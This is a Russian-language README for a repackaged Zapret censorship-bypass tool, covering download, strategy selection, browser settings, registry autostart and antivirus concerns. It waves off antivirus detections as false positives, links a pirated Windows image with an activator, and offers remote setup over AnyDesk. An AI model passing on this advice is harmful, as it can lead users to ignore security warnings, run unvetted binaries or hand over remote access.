<h1 align="center"><img src="https://i.imgur.com/uABXHHI.png" width="30px"></img> <a href="https://github.com/bol-van/zapret">Zapret</a> (Запрет: обход блокировки Дискорда и Ютуба) </h1>

### 1. Скачать по ссылке https://github.com/censorliber/zapret_binary/raw/refs/heads/main/zapret6.3.3.exe
### 2. Запустите файл **`start.bat`**
### 3. Пробуйте различные стратегии (набрав необходимую цифру и после Enter) для обходка блокировок.
### 4. Пробуйте ЛЮБЫЕ стратегии которые существуют, но перед этим попробуйте стратегии непосредственно для **ВАШЕГО** провайдера
### 6. Вы также можете использовать дополнительные настройки `9X`, чтобы например разблокировать Instagram и Facebook, а также сменить DNS.
### 7. **НЕ ЗАКРЫВАЙТЕ ОКНО КОНСОЛИ** `windivert initialized. capture is started`, так как данная надпись означает что Zapret **успешно** **запущен**

**Не используйте приложение Discord, вместо этого подключайтесь по ссылке https://discord.com/channels/@me**!!

![image](https://github.com/user-attachments/assets/3b52ddd1-ee0c-4c58-bab1-ffa6202e172c)

## 1. Перед тем как использовать
> [!CAUTION]  
> [Касперский](https://github.com/bol-van/zapret/issues/611) и иные российские вирусы начали войну с запретами и иными средствами обхода блокировок. Чтобы использовать их спокойно рекомендуется перейти на альтернативные американские антивирусы (Defender, ESET32 и т.д.), которые не выдают ложные и обманчивые срабатывания и помогают от большего количества угроз.

> [!CAUTION]  
> [Яндекс DNS](https://t.me/bypassblock/134) перестали открывать Discord и другие заблокированные сайты. Не пользуйтесь ими. Рекомендуем сменить их на [**Google DNS**](https://developers.google.com/speed/public-dns) или [**Quad9 DNS**](https://quad9.net/service/service-addresses-and-features). Программа быстро позволяет Вам это сделать (опции `92` и `93`)

### 1.1. Chromium браузеры
Все конфиги представленные ниже работают Chromium подобных браузерах (Chrome, Vivaldi и т.д.). Поэтому рекомендуем переключиться на них. **Никакие флаги переключать там не нужно, всё оставляем по умолчанию!**

**К сожалению в некоторых случаях Яндекс браузер может блокировать работу программы и определять её как вирус (новые версии программы ещё не внесены в базы и они игнорируются). <br> Поэтому рекомендуем воздержаться от его использования.**

![image](https://github.com/user-attachments/assets/03367961-c045-4d62-a1a3-a54814381843)

Не используйте Cent Browser и иные подобные браузеры со встроенными блокировщиками (Thorium (_Thromium_), Ungoogled Chromium, Iridum, Brave, Opera GX и т.д.). Они безусловно полезны, но могут отключать некоторые функции, такие как WebRTC, которая важна для работы Discord. Поэтому для необходимых ресурсов используйте чистые браузеры. 

Включите кастомное DNS

```
https://dns.comss.one/dns-query
```

в браузерах по адресу:

```
chrome://settings/security
```

### 1.2. Firefox браузеры
Firefox 132 [включает](https://ntc.party/t/%D0%B2%D0%B0%D0%B6%D0%BD%D0%BE-firefox-132-%D0%B2%D0%BA%D0%BB%D1%8E%D1%87%D0%B0%D0%B5%D1%82-kyber-%D0%BF%D0%BE-%D1%83%D0%BC%D0%BE%D0%BB%D1%87%D0%B0%D0%BD%D0%B8%D1%8E/12652) kyber по-умолчанию. Зайдите по адресу `about:config` и отключите (_поставьте **`false`**_):
```
network.http.http3.enable_kyber
```

А также 
```
security.tls.enable_kybe
```

Затем включите опции (_поставьте **`true`**_):
```
network.dns.disableIPv6
```

```
network.http.http3.enable
```

```
network.http.http3.retry_different_ip_family
```

Включите кастомное DNS

```
https://dns.comss.one/dns-query
```

в браузерах по адресу:

```
about:preferences#privacy
```

### 1.3 Сборки Windows
Участились случаи попытки заблокировать обходы блокировок от систем Windows встроенные в ноутбуки, которые поставляются из под коробки самим производителем. В таком случае нужно заменить систему на свою чистую (_не сборку!_).

Если у Вас ну никак не работает Zapret - поставьте чистую Windows, например [LTSC](https://windows64.net/398-windows-10-x64-ltsc-21h2-s-aktivatorom-na-russkom.html). 

## 2. Частые ошибки
### По всем вопросам обращаться в группу https://t.me/youtubenotwork или https://discord.gg/kkcBDG2uws
### Другие полезные сервисы и VPN https://github.com/awesome-windows11/CensorNet
> [!CAUTION]  
> При любых ошибках просьба **ВСЕГДА** оставляйте скриншот и изображение ошибки.
> 
> Не описывайте их на словах (ничего не работает, не запускается и т.д.), **так Вам нельзя будет помочь**, так как не понятно что за проблема.
>
> 
> Также следует писать Вашего **провайдера и город**, чтобы можно было составить список рабочих конфигураций для различных провайдеров, который будет не публичный.

> [!WARNING]  
> Если не работает Discord, указывается используете ли вы **приложение** или веб браузер. Если используется **веб браузер** (_что рекомендуется_), то указывайте бренд и имя версии.

> [!TIP]  
> Если совсем отчаетесь то можете написать в [ЛС **БЕСПЛАТНЫЙ** запрос на удалённую настройку](https://t.me/youtubenotwork/4764) через AnyDesk. В любой момент подключение можно завершить и удалить программу.

> [!TIP]  
> Автор KDS. Его оригинальный [архив сборок](https://ntc.party/t/ytdisbystro-%D0%B0%D1%80%D1%85%D0%B8%D0%B2-%D0%B2%D1%81%D0%B5%D1%85-%D0%B2%D0%B5%D1%80%D1%81%D0%B8%D0%B9/12582)

### Мой N-ый сайт не работает! Что делать?
Свои сайты следует добавлять в файл `other.txt`, так как иначе программа не поймёт какие сайты фильтровать.

### Аватарки Discord не работают!
Если Zapret не может разблокировать иконки Discord - выключите DNS в браузере и оставьте его по умолчанию. Это может помочь.

![image](https://github.com/user-attachments/assets/e4c9f139-dcd6-4197-90b8-ca54b2e10e1b)

## 3. Обход блокировок аватарок в Instagram
К сожалению сервис и сайт `scontent-hel3-1.cdninstagram.com` использует только один IP адрес, и обойти его блокировку посредствам DNS не предоставляется возможным. Поэтому для обхода блокировок именно Instagram аватарок, следует обратиться к VPN.

![image](https://github.com/user-attachments/assets/57eaf8ff-eb76-4e16-8626-714c53de23bb)

![image](https://github.com/user-attachments/assets/8e11a3df-c720-4261-be9a-8b39af9ee32e)

## 4. Автозапуск
Запустите данную команду из консоли (_`win + r`, потом `cmd.exe`_), где следует указать необходимый `cmd` файл (_в данном случае `C:\Zapret-main\start1.cmd`)_:

```cmd
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Zapret /t REG_SZ /d "C:\Zapret-main\start1.cmd" /f
```

> [!NOTE]  
> Это будет каждый раз открывать окно консоли, но его можно перенести на другой рабочий стол через комбинацию `win + tab`

## 5. О вирусах
> [!CAUTION]
> ### Вирусная копия Zapret!
> Телеграм канал `peekbot` начал распространять [вирусы](https://github.com/Flowseal/zapret-discord-youtube/issues/794) под предлогом Zapret. Будьте внимательны! Также у них имеется вредоносный сайт `https://gitrok.com`!
>
> В папке висит вирусный **cygwin.exe** который весит свыше 13 МБ. Такие [большие файлы](https://www.virustotal.com/gui/file/5591f24e96ed8d2877ac056955f5aaeb45fab792f1b35d635ae4a961c7000e26/detection) никогда не находились в оригинальном Zapret.

Вирусов в программе нет. Данное творение создано с открытым исходным кодом, и Вы можете собрать его самостоятельно. В данном случае на программу ругаются неизвестные китайские вирусы, а также 360 Total Security, который является китайским и не заслуживает доверия. Все американские антивирусы молчат.

**Подробнее про "вирусный" драйвер [WinDivert.dll](https://ntc.party/t/windivert-%D1%87%D1%82%D0%BE-%D1%8D%D1%82%D0%BE-%D1%82%D0%B0%D0%BA%D0%BE%D0%B5-%D0%B7%D0%B0%D1%87%D0%B5%D0%BC-%D0%B2-%D0%BD%D1%91%D0%BC-%D0%BC%D0%B0%D0%B9%D0%BD%D0%B5%D1%80/12838)**

Вот [пример](https://www.virustotal.com/gui/file/a188ff24aec863479408cee54b337a2fce25b9372ba5573595f7a54b784c65f8/detection) незараженного dll файла, который всего лишь изменяет код некоторых файлов для запуска пиратской игры. Данный dll хорошо известен и достаточно популярный на запада, однако антивирусы сходят с ума когда его видят.

![image](https://github.com/user-attachments/assets/040a0fd7-be98-4db3-9b7b-c5bc971f14a7)

**Win64/Trojan.Generic.HgEATiwA** — китайские антивирусы часто нумируют так неизвестные им программы, которые как-то вшиваются в трафик. Доказательства этому приведены [здесь](https://www.reddit.com/r/GenP/comments/14ul7nd/is_trojan_win64_downloader_sa_a_false_positive/), [здесь](https://www.reddit.com/r/BlueStacks/comments/xjc4z1/trojangenerichbadk_is_malware/) и [здесь](https://www.reddit.com/r/antivirus/comments/15kqey4/trojangenerichetyo_false_pozitive_please_help).

> [!CAUTION]  
> **Неизвестные источники могут маскировать Zapret под вирусы!**
> <br>
> Есть способ защититься от этого - всегда сверяйте хэш файла **[`WinDivert.dll`](https://github.com/basil00/WinDivert)** и **`winws.exe`**. Если хэш суммы одинаковые, это значит что файлы никак не были изменены автором и были загружены из оригинального источника.

[Оригинальные](https://www.virustotal.com/gui/file/0453fce6906402181dbff7e09b32181eb1c08bb002be89849e8992b832f43b89/detection) хэщи программы **`winws.exe`**
- MD5 `444fe359ca183016b93d8bfe398d5103`
- SHA-1 `61716de8152bd3a59378a6cd11f6b07988a549d5`
- SHA-256 `0453fce6906402181dbff7e09b32181eb1c08bb002be89849e8992b832f43b89`

Версия [v68](https://www.virustotal.com/gui/file/c26719336725fda6d48815582acee198c0d7d4f6a6f9f73b5e0d58ca19cfbe35/detection)
- MD5 `c36c5c34d612ffc684047b7c87310a1f`
- SHA-1 `5b9a89d08554f911e93665a3910ff16db33bf1ce`
- SHA-256 `c26719336725fda6d48815582acee198c0d7d4f6a6f9f73b5e0d58ca19cfbe35`

<div align='center'><a href=''><img src='https://www.websitecounterfree.com/c.php?d=9&id=60326&s=1' border='0' alt='Free Website Counter'></a><br / ><small></small></div>
